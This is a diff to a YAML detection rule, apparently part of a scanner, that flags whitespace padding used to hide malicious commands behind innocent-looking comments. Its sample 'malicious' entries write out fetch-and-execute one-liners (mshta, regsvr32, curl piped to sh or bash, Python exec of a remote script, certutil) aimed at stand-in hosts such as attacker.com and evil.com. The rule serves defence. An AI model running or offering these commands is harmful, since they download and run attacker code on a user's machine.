@@ -1,8 +1,8 @@
-name: medium-62-whitespace-padding-comment
+name: medium-23-whitespace-padding-comment
 severity: medium
 description: >
   Detects excessive whitespace padding before a comment character.
-  FileFix and ClickFix variants use long sequences of spaces to push malicious code off the visible portion of the UI.
+  Uses long sequences of spaces to push malicious code off the visible portion of the UI.
 
 pattern: |
   [\s\u00A0]{10,}#
@@ -15,8 +15,8 @@ malicious:
   - "mshta http://attacker.com/payload.hta                         # Help documentation"
   - "powershell -enc SQBFAFgAKABOAGUAdw==                  # Configuration script"
   - "bash -c 'curl -s http://evil.com/script.sh | sh'                       # Setup utility"
-  - "python -c \"import urllib;exec(urllib.urlopen('http://mal.com/p').read())\"                    # Python script"
-  - "osascript -e 'do shell script \"curl http://attacker.com/m.sh | bash\"'                        # macOS utility"
+  - 'python -c "import urllib;exec(urllib.urlopen(''http://mal.com/p'').read())"                    # Python script'
+  - 'osascript -e ''do shell script "curl http://attacker.com/m.sh | bash"''                        # macOS utility'
   - "%USERPROFILE%\\Downloads\\payload.exe                     # Document viewer"
   - "certutil -decode evil.b64 evil.exe && evil.exe                          # Certificate update"
   - "regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll                             # System registration"
